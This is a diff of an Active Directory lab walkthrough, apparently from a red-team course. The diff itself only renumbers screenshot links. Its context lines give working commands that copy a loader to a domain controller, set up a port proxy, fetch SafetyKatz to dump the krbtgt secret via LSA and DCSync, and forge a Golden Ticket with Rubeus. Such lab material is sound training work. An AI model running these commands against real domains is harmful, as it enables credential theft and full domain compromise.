@@ -24,7 +24,7 @@ Run the below commands from the process running as DA to copy Loader.exe on dcor
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1426).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (554).png" alt=""><figcaption></figcaption></figure>
 
 Before it, connect to the dc machine "dcorp-dc" like svcadmin and apply the portforwardding and execute the loader + safetikatz-->
 
@@ -32,7 +32,7 @@ Before it, connect to the dc machine "dcorp-dc" like svcadmin and apply the port
 winrs -r:dcorp-dc cmd
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1423).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (551).png" alt=""><figcaption></figcaption></figure>
 
 ```
 netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.113
@@ -42,7 +42,7 @@ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 conne
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1424).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (552).png" alt=""><figcaption></figcaption></figure>
 
 > Please note that the `krbtgt` account password may be changed and the hash you get in your lab instance could be different from the one in this lab manual.
 >
@@ -56,7 +56,7 @@ Run the below command from process running as Domain Admin on the student VM:
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1425).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (553).png" alt=""><figcaption></figcaption></figure>
 
 Info obtained:
 
@@ -82,11 +82,11 @@ C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-g
 
 > In us vm student console/machine
 
-<figure><img src="../../../.gitbook/assets/image (1428).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (556).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (1429).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (557).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (1430).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (558).png" alt=""><figcaption></figcaption></figure>
 
 Now, use the generated command to forge a Golden ticket. Remember to add `-path C:\AD\Tools\Rubeus.exe -args` after `Loader.exe` and `/ptt` at the end of the generated command to inject it in the current process. Once the ticket is injected, we can access resources in the domain:
 
@@ -106,10 +106,10 @@ Now, use the generated command to forge a Golden ticket. Remember to add `-path 
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:3046 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1431).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (559).png" alt=""><figcaption></figcaption></figure>
 
 ```
 winrs -r:dcorp-dc cmd
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1432).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (560).png" alt=""><figcaption></figcaption></figure>
